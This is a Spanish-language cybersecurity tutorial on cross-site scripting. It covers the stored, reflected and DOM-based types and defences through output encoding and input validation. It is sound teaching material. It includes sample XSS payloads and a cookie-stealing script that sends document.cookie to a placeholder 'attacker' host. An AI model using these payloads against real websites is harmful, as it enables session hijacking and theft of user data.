- **Robo de información:** Un atacante puede robar información confidencial del usuario, como credenciales de inicio de sesión, información bancaria o datos personales.
- **Ataques de phishing**: Se puede utilizar XSS para engañar a los usuarios para que proporcionen información personal o confidencial, como contraseñas o números de tarjetas de crédito.
- **Manipulación del contenido:** También puede ser utilizado para manipular el contenido de un sitio web, por ejemplo, para mostrar mensajes falsos, redireccionar a los usuarios a sitios maliciosos o incluso para cambiar la apariencia del sitio web.
- **Robo de sesiones:** Es posible inyectar código malicioso que intercepte la sesión de un usuario, lo que le permite realizar acciones en nombre del usuario.
- **Difusión de malware:** También un atacante puede utilizar XSS para inyectar código malicioso que descarga y ejecuta malware en el equipo del usuario sin su conocimiento o consentimiento.
- El impacto exacto depende en gran medida de la aplicación.
- XSS es generalmente una amenaza para las aplicaciones web que tienen usuarios autenticados o que son sensibles a la seguridad.
- El código malicioso puede ser capaz de manipular el contenido del sitio, cambiando su apariencia y/o función para otro usuario.
- Esto incluye modificar el comportamiento de la aplicación web (como redirigir formularios, etc.).
- El código también puede ser capaz de realizar acciones dentro de la aplicación sin conocimiento del usuario.
- El código script también puede obtener y retransmitir los valores de las cookies si no han sido configuradas como HttpOnly.

### Hay 3 tipos principales de XSS

- **Almacenado** : la entrada del usuario se almacena en el sitio web. Suele ocurrir en perfiles de usuario, foros, chats, etc., donde el contenido del usuario se almacena de forma permanente (o temporal). Los atacantes pueden inyectar cargas útiles maliciosas y todos los usuarios que naveguen por la página infectada se verán afectados. Esta es una de las formas más peligrosas de XSS porque la explotación no requiere phishing y puede afectar a muchos usuarios. Los XSS en páginas en las que solo el usuario del atacante tiene derecho a navegar (por ejemplo, la página de configuración del usuario) se denominan self-XSS y se considera que tienen un impacto cercano a 0, ya que teóricamente no puede afectar a otros usuarios.
- **Reflejado** : la entrada del usuario se refleja pero no se almacena. Suele ocurrir en formularios de búsqueda, páginas de inicio de sesión y páginas que reflejan contenido para una sola respuesta. Cuando la entrada vulnerable reflejada está en el URI ( [http://www.target.com/search.php?keyword=INJECTION](http://www.target.com/search.php?keyword=INJECTION)), los atacantes pueden crear un URI malicioso y enviarlo a las víctimas con la esperanza de que lo exploren. Esta forma de XSS generalmente requiere phishing y los atacantes pueden limitar la longitud de la carga maliciosa.
- **Basado en DOM** : mientras que los ataques XSS almacenados y reflejados explotan vulnerabilidades en el código del lado del servidor, un XSS basado en DOM explota las del lado del cliente (por ejemplo, JavaScript utilizado para ayudar a representar dinámicamente una página). Los XSS basados ​​en DOM generalmente afectan las entradas del usuario que se reflejan temporalmente, al igual que los ataques XSS reflejados.

## Práctica:

Los evaluadores deben identificar los vectores de entrada (partes de la aplicación que aceptan contenido de los usuarios) que se almacenan o reflejan.

- Parámetros de URI para XSS reflejado y basado en DOM
- Otras entradas de usuarios en foros, chats, comentarios, publicaciones y otro contenido almacenado para XSS almacenado
- Encabezados HTTP como cookies (e incluso agentes de usuario en algunos casos)

Una de las cargas útiles más famosas es <script>alert('XSS');</script>abrir una ventana emergente que hace eco de "XSS". Sin embargo, explotar XSS es como jugar al "gato y al ratón". Las entradas se pueden filtrar y los filtros se pueden omitir. A continuación se muestran algunos ejemplos básicos de cargas útiles XSS.

> <script>alert('XSS');</script>
> 
> 
> <IMG SRC=JaVaScRiPt:alert('XSS')>
> 
> <IMG onmouseover="alert('XSS')">
> 
> <<SCRIPT>alert("XSS");//<</SCRIPT>

> El siguiente [sitio web](https://transformations.jobertabma.nl/) ( [proyecto GitHub](https://github.com/jobertabma/transformations) ) puede ayudar a identificar las transformaciones aplicadas a las entradas de los usuarios. Esto puede ayudar a eludir filtros y transformaciones para aprovechar los ataques XSS.

> La siguiente carga útil se utiliza para probar inyecciones de SQL , XSS (Cross-Site Scripting) y SSTI (Inyección de plantilla del lado del servidor) .
> 
> '"<svg/onload=prompt(5);>{{7*7}}


Herramientas como [XSStrike](https://github.com/s0md3v/XSStrike) (Python) y [XSSer](https://github.com/epsylon/xsser) (Python) también pueden ayudar a encontrar y explotar vectores de entrada vulnerables XSS al fusionarlos con cargas útiles únicas y luego buscar patrones únicos en las respuestas.

​El atacante no apunta directamente a su víctima. En cambio, explota una vulnerabilidad en un sitio web que visita la víctima, para que el sitio web le entregue el JavaScript malicioso. Para el navegador de la víctima, el JavaScript malicioso parece ser una parte legítima del sitio web y, por lo tanto, el sitio web ha actuado como cómplice involuntario del atacante.

# **Cómo se inyecta el JavaScript malicioso**

La única forma que tiene el atacante de ejecutar su JavaScript malicioso en el navegador de la víctima es inyectarlo en una de las páginas que la víctima descarga del sitio web. Esto puede suceder si el sitio web incluye directamente la entrada del usuario en sus páginas, porque el atacante puede insertar una cadena que el navegador de la víctima tratará como código.

En el siguiente ejemplo, se utiliza un script simple del lado del servidor para mostrar el último comentario en un sitio web:

> print "<html>"
> 
> 
> print "Latest comment:"
> 
> print database.latestComment
> 
> print "</html>"

El script supone que un comentario consta únicamente de texto. Sin embargo, dado que la entrada del usuario se incluye directamente, un atacante podría enviar este comentario: " <script>...</script>". Cualquier usuario que visite la página recibirá ahora la siguiente respuesta:

> <html>
> 
> 
> Latest comment:
> 
> **<script>...</script>**
> 
> </html>
> 

Cuando el navegador del usuario carga la página, ejecutará cualquier código JavaScript contenido dentro de las <script>etiquetas. El atacante ahora ha tenido éxito con su ataque.

## **¿Qué es JavaScript malicioso?**

Al principio, la capacidad de ejecutar JavaScript en el navegador de la víctima puede no parecer particularmente maliciosa. Después de todo, JavaScript se ejecuta en un entorno muy restringido que tiene un acceso extremadamente limitado a los archivos y al sistema operativo del usuario. De hecho, podría abrir la consola JavaScript de su navegador ahora mismo y ejecutar cualquier JavaScript que desee, y sería muy poco probable que cause algún daño a su computadora.

Sin embargo, la posibilidad de que JavaScript sea malicioso se vuelve más clara cuando se consideran los siguientes hechos:

- JavaScript tiene acceso a parte de la información confidencial del usuario, como las cookies.
- JavaScript puede enviar solicitudes HTTP con contenido arbitrario a destinos arbitrarios mediante el uso XMLHttpRequestde otros mecanismos.
- JavaScript puede realizar modificaciones arbitrarias al HTML de la página actual utilizando métodos de manipulación DOM.

Estos hechos combinados pueden provocar fallos de seguridad muy graves, como explicaremos a continuación.

### **Las consecuencias del JavaScript malicioso**

Entre muchas otras cosas, la capacidad de ejecutar JavaScript arbitrario en el navegador de otro usuario permite a un atacante realizar los siguientes tipos de ataques:

### **Robo de cookies**

El atacante puede acceder a las cookies de la víctima asociadas con el sitio web mediante document.cookie, enviarlas a su propio servidor y utilizarlas para extraer información confidencial como ID de sesión.

### **Registro de teclas**

El atacante puede registrar un detector de eventos de teclado addEventListenery luego enviar todas las pulsaciones de teclas del usuario a su propio servidor, registrando potencialmente información confidencial como contraseñas y números de tarjetas de crédito.

### **Suplantación de identidad**

El atacante puede insertar un formulario de inicio de sesión falso en la página mediante manipulación DOM, configurar el actionatributo del formulario para que apunte a su propio servidor y luego engañar al usuario para que envíe información confidencial.

<aside>
👉 Aunque estos ataques difieren significativamente, todos tienen una similitud crucial: debido a que el atacante ha inyectado código en una página proporcionada por el sitio web, el JavaScript malicioso se ejecuta en el contexto de ese sitio web. Esto significa que se trata como cualquier otro script de ese sitio web: tiene acceso a los datos de la víctima para ese sitio web (como las cookies) y el nombre de host que se muestra en la barra de URL será el del sitio web. Para todos los efectos, el script se considera una parte legítima del sitio web, lo que le permite hacer cualquier cosa que el sitio web real pueda hacer.
</aside>

**Este hecho pone de relieve una cuestión clave:**

*Si un atacante puede utilizar su sitio web para ejecutar JavaScript arbitrario en el navegador de otro usuario, la seguridad de su sitio web y de sus usuarios se ha visto comprometida.* Para enfatizar este punto, algunos ejemplos de este tutorial omitirán los detalles de un script malicioso al mostrar solo <script>...</script>. Esto indica que la mera presencia de un script inyectado por el atacante es el problema, independientemente del código específico que realmente ejecute el script.

# **Actores en un ataque XSS**

Antes de describir en detalle cómo funciona un ataque XSS, debemos definir los actores involucrados en un ataque XSS. En general nvolucra a tres actores: **el sitio web** , **la víctima** y **el atacante** .

- **El sitio web** ofrece páginas HTML a los usuarios que las solicitan. En nuestros ejemplos, está ubicado en [http://website/](http://website/).
- **La base de datos del sitio web** es una base de datos que almacena algunas de las entradas del usuario incluidas en las páginas del sitio web.
- **La víctima** es un usuario normal del sitio web que solicita páginas del mismo a través de su navegador.
- **El atacante** es un usuario malintencionado del sitio web que pretende lanzar un ataque contra la víctima explotando una vulnerabilidad XSS en el sitio web.
- **El servidor del atacante** es un servidor web controlado por el atacante con el único propósito de robar información confidencial de la víctima. En nuestros ejemplos, está ubicado en [http://attacker/](http://attacker/).

**Un ejemplo de escenario de ataque**

En este ejemplo, asumiremos que el objetivo final del atacante es robar las cookies de la víctima explotando una vulnerabilidad XSS en el sitio web. Esto se puede hacer haciendo que el navegador de la víctima analice el siguiente código HTML:

> <script>
> 
> 
> window.location='http://attacker/?cookie='+document.cookie
> 
> </script>

Este script navega por el navegador del usuario a una URL diferente, lo que activa una solicitud HTTP al servidor del atacante. La URL incluye las cookies de la víctima como parámetro de consulta, que el atacante puede extraer de la solicitud cuando llega a su servidor. Una vez que el atacante ha adquirido las cookies, puede utilizarlas para hacerse pasar por la víctima y lanzar más ataques.

De ahora en adelante, el código HTML anterior se denominará **cadena maliciosa** o **script malicioso.** Es importante tener en cuenta que la cadena en sí sólo es maliciosa si finalmente se analiza como HTML en el navegador de la víctima, lo que sólo puede ocurrir como resultado de una vulnerabilidad XSS en el sitio web.

## **Cómo funciona el ataque**

El siguiente diagrama ilustra cómo un atacante puede realizar este ataque de ejemplo:

![XSS2](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/xss2.png?raw=true)

1. El atacante utiliza uno de los formularios del sitio web para insertar una cadena maliciosa en la base de datos del sitio web.
2. La víctima solicita una página del sitio web.
3. El sitio web incluye la cadena maliciosa de la base de datos en la respuesta y la envía a la víctima.
4. El navegador de la víctima ejecuta el script malicioso dentro de la respuesta y envía las cookies de la víctima al servidor del atacante.

## **Tipos de XSS**

Si bien el objetivo de un ataque XSS es siempre ejecutar JavaScript malicioso en el navegador de la víctima, existen pocas formas fundamentalmente diferentes de lograr ese objetivo. Los ataques XSS suelen dividirse en tres tipos:

- **XSS persistente** , donde la cadena maliciosa se origina en la base de datos del sitio web.
- **XSS reflejado** , donde la cadena maliciosa se origina a partir de la solicitud de la víctima.
- **XSS basado en DOM** , donde la vulnerabilidad está en el código del lado del cliente en lugar del código del lado del servidor.

<aside>
💡 El ejemplo anterior ilustró un ataque XSS persistente. Ahora describiremos los otros dos tipos de ataques XSS: XSS reflejado y XSS basado en DOM.
</aside>

### **XSS reflejado**

En un ataque XSS reflejado, la cadena maliciosa es parte de la solicitud de la víctima al sitio web. Luego, el sitio web incluye esta cadena maliciosa en la respuesta enviada al usuario. El siguiente diagrama ilustra este escenario:

![XSS3](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/xss3.png?raw=true)

1. El atacante crea una URL que contiene una cadena maliciosa y se la envía a la víctima.
2. El atacante engaña a la víctima para que solicite la URL del sitio web.
3. El sitio web incluye la cadena maliciosa de la URL en la respuesta.
4. El navegador de la víctima ejecuta el script malicioso dentro de la respuesta y envía las cookies de la víctima al servidor del atacante.

**¿Cómo puede tener éxito el XSS reflejado?**

Al principio, el XSS reflejado puede parecer inofensivo porque requiere que la propia víctima envíe una solicitud que contenga una cadena maliciosa. Dado que nadie se atacaría voluntariamente, no parece haber forma de realizar el ataque.

Resulta que hay al menos dos formas comunes de hacer que una víctima lance un ataque XSS reflejado contra sí misma:

- Si el usuario se dirige a un individuo específico, el atacante puede enviar la URL maliciosa a la víctima (mediante correo electrónico o mensajería instantánea, por ejemplo) y engañarla para que la visite.
- Si el usuario se dirige a un grupo grande de personas, el atacante puede publicar un enlace a la URL maliciosa (en su propio sitio web o en una red social, por ejemplo) y esperar a que los visitantes hagan clic en él.

Estos dos métodos son similares y ambos pueden tener más éxito con el uso de un servicio de acortamiento de URL, que enmascara la cadena maliciosa de los usuarios que de otro modo podrían identificarla.

Lo que hemos discutido anteriormente es una vulnerabilidad XSS reflejada. Un ataque XSS reflejado suele ser un enlace que contiene código malicioso. Cuando alguien hace clic en ese enlace, se le dirige a un sitio web vulnerable y ese código malicioso se "refleja" en su navegador para realizar alguna acción maliciosa.

Los ataques XSS reflejados son mucho menos peligrosos que las vulnerabilidades XSS almacenadas (ver más abajo) por varias razones:

Los ataques XSS reflejados dependen de que la víctima realice algún tipo de acción mediante la cual visita el sitio web de destino y hace que genere contenido que realiza una acción maliciosa en su navegador. Esto hace que los ataques XSS reflejados sean muy difíciles o, a veces, imposibles de automatizar. Cada víctima debe ser atacada individualmente con un correo electrónico o algún otro contenido que contenga un enlace malicioso en el que deben hacer clic para ser el objetivo del ataque.

### **XSS basado en DOM**

XSS basado en DOM es una variante de XSS tanto persistente como reflejado. En un ataque XSS basado en DOM, el navegador de la víctima no analiza la cadena maliciosa hasta que se ejecuta el JavaScript legítimo del sitio web. El siguiente diagrama ilustra este escenario para un ataque XSS reflejado:

![XSS4](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/xss4.png?raw=true)

1. El atacante crea una URL que contiene una cadena maliciosa y se la envía a la víctima.
2. El atacante engaña a la víctima para que solicite la URL del sitio web.
3. El sitio web recibe la solicitud, pero no incluye la cadena maliciosa en la respuesta.
4. El navegador de la víctima ejecuta el script legítimo dentro de la respuesta, lo que provoca que el script malicioso se inserte en la página.
5. El navegador de la víctima ejecuta el script malicioso insertado en la página y envía las cookies de la víctima al servidor del atacante.

**¿Qué hace que XSS basado en DOM sea diferente?**

En los ejemplos anteriores de ataques XSS persistentes y reflejados, el servidor inserta el script malicioso en la página, que luego se envía como respuesta a la víctima. Cuando el navegador de la víctima recibe la respuesta, asume que el script malicioso es parte del contenido legítimo de la página y lo ejecuta automáticamente durante la carga de la página como con cualquier otro script.

Sin embargo, en el ejemplo de un ataque XSS basado en DOM, no se inserta ningún script malicioso como parte de la página; el único script que se ejecuta automáticamente durante la carga de la página es una parte legítima de la página. El problema es que este script legítimo utiliza directamente la entrada del usuario para agregar HTML a la página. Debido a que la cadena maliciosa se inserta en la página usando innerHTML, se analiza como HTML, lo que provoca que se ejecute el script malicioso.

**La diferencia es sutil pero importante:**

- En XSS tradicional, el JavaScript malicioso se ejecuta cuando se carga la página, como parte del HTML enviado por el servidor.
- En XSS basado en DOM, el JavaScript malicioso se ejecuta en algún momento después de que la página se haya cargado, como resultado de que el JavaScript legítimo de la página trata la entrada del usuario de forma insegura.

**Por qué es importante el XSS basado en DOM**

En el ejemplo anterior, JavaScript no era necesario; el servidor podría haber generado todo el HTML por sí solo. Si el código del lado del servidor estuviera libre de vulnerabilidades, el sitio web estaría a salvo de XSS.

Sin embargo, a medida que las aplicaciones web se vuelven más avanzadas, JavaScript genera una cantidad cada vez mayor de HTML en el lado del cliente en lugar de hacerlo en el servidor. Cada vez que sea necesario cambiar el contenido sin actualizar toda la página, la actualización debe realizarse mediante JavaScript. En particular, este es el caso cuando una página se actualiza después de una solicitud AJAX.

Esto significa que las vulnerabilidades XSS pueden estar presentes no sólo en el código del lado del servidor de su sitio web, sino también en el código JavaScript del lado del cliente de su sitio web. En consecuencia, incluso con un código del lado del servidor completamente seguro, el código del lado del cliente aún podría incluir de manera insegura la entrada del usuario en una actualización del DOM después de que se haya cargado la página. Si esto sucede, el código del lado del cliente ha habilitado un ataque XSS sin que sea culpa del código del lado del servidor.

### **XSS basado en DOM invisible para el servidor**

Existe un caso especial de XSS basado en DOM en el que, para empezar, la cadena maliciosa nunca se envía al servidor del sitio web: cuando la cadena maliciosa está contenida en el identificador de fragmento de una URL (cualquier cosa después del carácter #). Los navegadores no envían esta parte de la URL a los servidores, por lo que el sitio web no tiene forma de acceder a ella mediante el código del lado del servidor. El código del lado del cliente, sin embargo, tiene acceso a él y, por lo tanto, puede causar vulnerabilidades XSS si lo maneja de manera insegura.

Esta situación no se limita a los identificadores de fragmentos. Otras entradas del usuario que son invisibles para el servidor incluyen nuevas funciones HTML5 como LocalStorage e IndexedDB.

Vulnerabilidades XSS almacenadas (o persistentes)

Un ataque XSS almacenado es mucho más peligroso por dos razones.

> En primer lugar, se puede automatizar un ataque XSS almacenado. Se puede crear un script que visite miles de sitios web, explote una vulnerabilidad en cada sitio y suelte una carga útil XSS almacenada.

> **En segundo lugar, las víctimas de un ataque XSS almacenado no tienen que realizar ninguna otra acción que no sea visitar el sitio web afectado.** Cualquiera que visite la página afectada del sitio se convertirá en víctima porque el código malicioso almacenado se cargará en su navegador. Las víctimas no necesitan realizar ninguna acción adicional, como hacer clic en un enlace enviado por correo electrónico, para verse afectadas.


Un ataque XSS almacenado ocurre cuando un atacante envía datos maliciosos a un sitio web que está almacenado en una base de datos o algún otro mecanismo de almacenamiento. Luego, cuando otros visitantes del sitio visitan una página o una URL específica, reciben esos datos que ejecutan y realizan algún tipo de acción maliciosa. Veamos un ejemplo:

![XSS5](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/xss5.png?raw=true)

El código anterior es una aplicación de libro de visitas muy básica. También es un ejemplo clásico de vulnerabilidad XSS almacenada. Cuando cargue esta aplicación, verá un formulario que le pedirá que firme un libro de visitas que se ve así:

![XSS6](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/xss6.png?raw=true)

Una vez que firmes el libro de visitas varias veces, verás algo como esto:

![XSS7](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/xss7.png?raw=true)

Si ingresa algo de javascript en el cuadro de texto de firma que ejecuta un cuadro de alerta, verá esto:

![XSS8](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/xss8.png?raw=true)

Lo que sucedió aquí es que un invitado ingresó algo de JavaScript en el campo "Firmar" que se ve así:

| 1 | <script>alert('XSS Expoit worked');</script> |

El javascript se almacenó y ahora se entrega a todos los visitantes de la página del libro de visitas. Esta es una **vulnerabilidad XSS almacenada** que tiene un impacto mucho más amplio que una vulnerabilidad XSS reflejada. Puede usarse para robar datos de cada visitante de la página afectada, no solo de los visitantes que hacen clic en un enlace especialmente diseñado. Por esta razón, las vulnerabilidades XSS almacenadas son mucho más graves que las XSS reflejadas.

Solucionar esta vulnerabilidad es fácil validando la entrada y desinfectando y escapando la salida. Apliquemos eso a este script. Revise los cambios a continuación.

![XSS9](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/xss9.png?raw=true)

Como puede ver en el ejemplo anterior, estamos validando los datos usando una expresión regular. Ahora sólo permitimos un pequeño subconjunto de caracteres en el libro de visitas. Aunque no permitimos etiquetas HTML, ejecutamos los datos a través de la función filter_var() de PHP con el filtro FILTER_SANITIZE_STRING para desinfectar la cadena, lo que eliminará cualquier etiqueta que pueda filtrarse debido a un error en nuestro código. FILTER_SANITIZE_STRING en realidad elimina cualquier etiqueta que encuentre.

Luego, cuando generamos cada registro en el libro de visitas, usamos filter_var con el filtro FILTER_SANITIZE_FULL_SPECIAL_CHARS que no elimina las etiquetas, pero las escapa si están presentes. Entonces, en el ejemplo anterior, estamos validando y desinfectando la entrada y escapando en la salida. Esto proporciona mucha protección contra un XSS almacenado en el caso de un libro de visitas.

<aside>
💭 **Una nota adicional sobre el código anterior:** probablemente hayas notado algunas otras cosas que podríamos hacer más seguras. Por ejemplo, almacenamos nuestro libro de visitas en un archivo que se encuentra en una carpeta accesible desde la web. Eso significa que el público puede leer los datos sin procesar. Esto en sí mismo es indeseable y darle a un atacante acceso de lectura a un archivo que no está diseñado para el consumo público puede introducir más vulnerabilidades. Una forma de solucionar esto es crear un archivo de datos pero darle una extensión PHP. Luego haga que la primera línea del archivo contenga lo siguiente:

</aside>

| 1 | <?php die("Nothing to see here!"); ?> |
| --- | --- |
|  |  |

Cuando escriba en el archivo, asegúrese de que la primera línea permanezca intacta. Cuando leas el archivo, descarta siempre la primera línea. Almacene el archivo con una extensión .php, por ejemplo, data.php. Luego, si un atacante intenta acceder al archivo, el servidor web lo tratará como PHP ejecutable y lo cerrará inmediatamente.

# **Métodos para prevenir XSS**

Recuerde que un ataque XSS es un tipo de inyección de código: la entrada del usuario se interpreta erróneamente como código de programa malicioso. Para evitar este tipo de inyección de código, es necesario un manejo seguro de la entrada. Para un desarrollador web, existen dos formas fundamentalmente diferentes de realizar un manejo seguro de la entrada:

- **Codificación**, que escapa de la entrada del usuario para que el navegador la interprete solo como datos, no como código.
- **Validación**, que filtra la entrada del usuario para que el navegador la interprete como código sin comandos maliciosos.

> Si bien estos son métodos fundamentalmente diferentes para prevenir XSS, comparten varias características comunes que es importante comprender al usar cualquiera de ellos:

- **Contexto:** El manejo seguro de la entrada debe realizarse de manera diferente según en qué parte de una página se inserte la entrada del usuario.
- **Entrante y saliente:** El manejo seguro de la entrada se puede realizar cuando su sitio web recibe la entrada (entrante) o justo antes de que su sitio web inserte la entrada en una página (saliente).
- **Servidor de cliente:** El manejo seguro de la entrada se puede realizar en el lado del cliente o en el lado del servidor, los cuales son necesarios en diferentes circunstancias. Antes de explicar en detalle cómo funcionan la codificación y la validación, describiremos cada uno de estos puntos.

### **Contextos de manejo de entradas**

Hay muchos contextos en una página web donde se pueden insertar las entradas del usuario. Para cada uno de ellos, se deben seguir reglas específicas para que la entrada del usuario no pueda salirse de su contexto y ser interpretada como código malicioso. A continuación se detallan los contextos más comunes:

| Contexto | Código de ejemplo |
| --- | --- |
| contenido del elemento HTML | <div>userInput</div> |
| valor del atributo HTML | <input value="userInput"> |
| valor de consulta de URL | http://example.com/?parameter=userInputhttp://example.com/?parameter=userInput |
| valor CSS | color: userInput |
| valor de javascript | var name = "userInput"; |

### **¿Por qué el contexto importa?**

En todos los contextos descritos, surgiría una vulnerabilidad XSS si la entrada del usuario se insertara antes de codificarse o validarse por primera vez. Luego, un atacante podría inyectar código malicioso simplemente insertando el delimitador de cierre para ese contexto y siguiéndolo con el código malicioso. Por ejemplo, si en algún momento un sitio web inserta información del usuario directamente en un atributo HTML, un atacante podría inyectar un script malicioso comenzando su entrada con una comilla, como se muestra a continuación:

| Código de aplicación | <input value="userInput"> |
| --- | --- |
| Cadena maliciosa | "><script>...</script><input value=" |
| Código resultante | <input value=""><script>...</script><input value=""> |

<aside>
👉 Esto podría evitarse simplemente eliminando todas las comillas en la entrada del usuario, y todo estaría bien, pero sólo en este contexto. Si la misma entrada se insertara en otro contexto, el delimitador de cierre sería diferente y la inyección sería posible. Por esta razón, el manejo seguro de la entrada siempre debe adaptarse al contexto donde se insertará la entrada del usuario.

</aside>

## **Manejo de entradas entrantes y salientes**

Instintivamente, podría parecer que XSS se puede prevenir codificando o validando todas las entradas del usuario tan pronto como su sitio web las reciba. De esta manera, cualquier cadena maliciosa ya debería haber sido neutralizada cada vez que se incluye en una página, y los scripts que generan HTML no tendrán que preocuparse por el manejo seguro de la entrada.

El problema es que, como se describió anteriormente, la entrada del usuario se puede insertar en varios contextos en una página. No existe una manera fácil de determinar cuándo llega la entrada del usuario y en qué contexto se insertará finalmente, y la misma entrada del usuario a menudo debe insertarse en contextos diferentes. Por lo tanto, confiar en el manejo de la entrada entrante para evitar XSS es una solución muy frágil que será propensa a errores. (La característica obsoleta de "[comillas mágicas](http://php.net/manual/en/security.magicquotes.php)" de PHP es un ejemplo de dicha solución).

En cambio, el manejo de la entrada saliente debería ser su principal línea de defensa contra XSS, porque puede tener en cuenta el contexto específico en el que se insertará la entrada del usuario. Dicho esto, la validación entrante aún se puede utilizar para agregar una capa secundaria de protección, como describiremos más adelante.

### **Dónde realizar un manejo seguro de la entrada**

En la mayoría de las aplicaciones web modernas, la entrada del usuario se maneja tanto mediante código del lado del servidor como mediante código del lado del cliente. Para protegerse contra todos los tipos de XSS, se debe realizar un manejo de entrada seguro tanto en el código del lado del servidor como en el código del lado del cliente.

- Para protegerse contra XSS tradicional, el manejo seguro de la entrada debe realizarse en el código del lado del servidor. Esto se hace utilizando cualquier lenguaje soportado por el servidor.
- Para protegerse contra XSS basado en DOM donde el servidor nunca recibe la cadena maliciosa (como el ataque de identificador de fragmento descrito anteriormente ), se debe realizar un manejo de entrada seguro en el código del lado del cliente. Esto se hace usando JavaScript.

Ahora que hemos explicado por qué es importante el contexto, por qué es importante la distinción entre el manejo de entradas entrantes y salientes y por qué es necesario realizar un manejo seguro de las entradas tanto en el código del lado del cliente como en el del lado del servidor, continuaremos explicando cómo funciona el contexto. En realidad, se realizan dos tipos de manejo seguro de entradas (codificación y validación).

### **Codificación**

La codificación es el acto de escapar de la entrada del usuario para que el navegador la interprete sólo como datos, no como código. El tipo de codificación más reconocible en el desarrollo web es el escape HTML, que convierte caracteres como **<**y **>**en **&lt;**y **&gt;**, respectivamente.

El siguiente pseudocódigo es un ejemplo de cómo la entrada del usuario podría codificarse utilizando el escape HTML y luego insertarse en una página mediante un script del lado del servidor:

> print "<html>"
> 
> 
> print "Latest comment: "
> 
> print encodeHtml(userInput)
> 
> print "</html>"
> 

Si la entrada del usuario fuera la cadena <script>...</script>, el HTML resultante sería el siguiente:

> <html>
> 
> 
> Latest comment:
> 
> **&lt;script&gt;...&lt;/script&gt;**
> 
> </html>
> 

<aside>
💡 Debido a que se han escapado todos los caracteres con significado especial, el navegador no analizará ninguna parte de la entrada del usuario como HTML.

</aside>

## **Codificación en código del lado del cliente y del lado del servidor**

Al realizar la codificación en el código del lado del cliente, el lenguaje utilizado siempre es JavaScript, que tiene funciones integradas que codifican datos para diferentes contextos.

Tmbién, debes confiar en las funciones disponibles en el lenguaje o marco del lado del servidor. Debido a la gran cantidad de lenguajes y marcos disponibles, este tutorial no cubrirá los detalles de la codificación en ningún lenguaje o marco específico del lado del servidor. Sin embargo, estar familiarizado con las funciones de codificación utilizadas en el lado del cliente en JavaScript también es útil al escribir código del lado del servidor.

### **Codificación en el lado del cliente**

Al codificar la entrada del usuario en el lado del cliente usando JavaScript, existen varios métodos y propiedades integrados que codifican automáticamente todos los datos según el contexto:

| Contexto | Método/propiedad |
| --- | --- |
| contenido del elemento HTML | node.textContent = userInput |
| valor del atributo HTML | element.setAttribute(attribute, userInput)
o
element[attribute] = userInput |
| valor de consulta de URL | window.encodeURIComponent(userInput) |
| valor CSS | element.style.property = userInput |

<aside>
💡 El último contexto mencionado anteriormente (valores de JavaScript) no está incluido en esta lista, porque JavaScript no proporciona una forma integrada de codificar los datos que se incluirán en el código fuente de JavaScript.

</aside>

## **Limitaciones de la codificación**

Incluso con codificación, será posible introducir cadenas maliciosas en algunos contextos. Un ejemplo notable de esto es cuando se utiliza la entrada del usuario para proporcionar URL, como en el siguiente ejemplo:

> document.querySelector('a').href = userInput

Aunque asignar un valor a la hrefpropiedad de un elemento ancla lo codifica automáticamente para que se convierta en nada más que un valor de atributo, esto en sí mismo no impide que el atacante inserte una URL que comience con " javascript:". Cuando se hace clic en el enlace, se ejecutará cualquier JavaScript incrustado dentro de la URL.

La codificación también es una solución inadecuada cuando realmente se desea que el usuario defina parte del código de una página. Un ejemplo es una página de perfil de usuario donde el usuario puede definir HTML personalizado. Si este HTML personalizado estuviera codificado, la página de perfil podría consistir únicamente en texto sin formato.

En situaciones como estas, la codificación debe complementarse con la validación, que describiremos a continuación.

### **Validación**

La validación es el acto de filtrar la entrada del usuario para que se eliminen todas las partes maliciosas, sin necesariamente eliminar todo el código que contiene. Uno de los tipos de validación más reconocibles en el desarrollo web es permitir algunos elementos HTML (como <em>y <strong>) pero no permitir otros (como <script>).

Hay dos características principales de validación que difieren entre implementaciones:

> Estrategia de clasificación: La entrada del usuario se puede clasificar mediante listas negras o listas blancas.
> 
> 
> **Resultado de la validación: Las entradas del usuario identificadas como maliciosas pueden rechazarse o desinfectarse.**
> 

### **Funciones para validar tus datos:**

La validación en programación es cuando verifica que los datos que su aplicación ha recibido se encuentran dentro de las restricciones que usted define para garantizar que no contengan nada irrazonable, innecesario o malicioso. **La validación no reemplaza la desinfección o el escape** , porque como veremos (en la sección que analiza filter_var() a continuación), los datos maliciosos pueden pasar algunas funciones de validación.

Las restricciones que utilizará varían, pero con frecuencia son similares a las restricciones utilizadas en un lenguaje estrictamente tipificado. Por ejemplo, podría utilizar algunas de las siguientes comprobaciones:

- ¿Son los datos un número entero? (solo de 0 a 9 dígitos)
- ¿Los datos son flotantes y se permite un punto decimal? (0 a 9 y carácter .)
- Son números de datos y guiones, por ejemplo, un campo de fecha de tarjeta de crédito.
- ¿Los datos son una cadena con números, letras, espacios y puntuación únicamente?
- ¿Los datos son una de un número limitado de opciones que se pueden seleccionar, por ejemplo, 'opción1', 'opción2', 'opción3'?

Durante la validación, si rechaza datos, a menudo devolverá un error al usuario describiendo el problema y solicitándole los datos correctos.

A continuación, hemos incluido funciones que los desarrolladores de PHP utilizan con frecuencia para comprobar si los datos recibidos por una aplicación son válidos (para validar datos). Por lo general, se usan en una declaración if() para verificar si los datos son válidos y, de lo contrario, la aplicación devuelve un error al usuario.

| Función | Que hace | Ejemplo |
| --- | --- | --- |
| es_numeric() | Prueba si los datos coinciden del 0 al 9 con signo opcional y punto decimal opcional. | is_numeric($input) devolverá verdadero si $input == '-9.123' |
| preg_match() | Pruebe si los datos coinciden con la expresión regular. | preg_match('/^[az]{2,3}$/', $input) devuelve verdadero si $input tiene letras minúsculas de 2 o 3 caracteres. Tenga en cuenta ^ y $ en la expresión regular. |
| var_filtro() | Pruebe si los datos se ajustan a un filtro PHP integrado. | filter_var($input, FILTER_VALIDATE_EMAIL) prueba si $input es una dirección de correo electrónico válida. Otros filtros útiles son FILTER_VALIDATE_IP, FILTER_VALIDATE_URL, FILTER_VALIDATE_BOOLEAN. http://php.net/manual/en/filter.filters.validate.php |
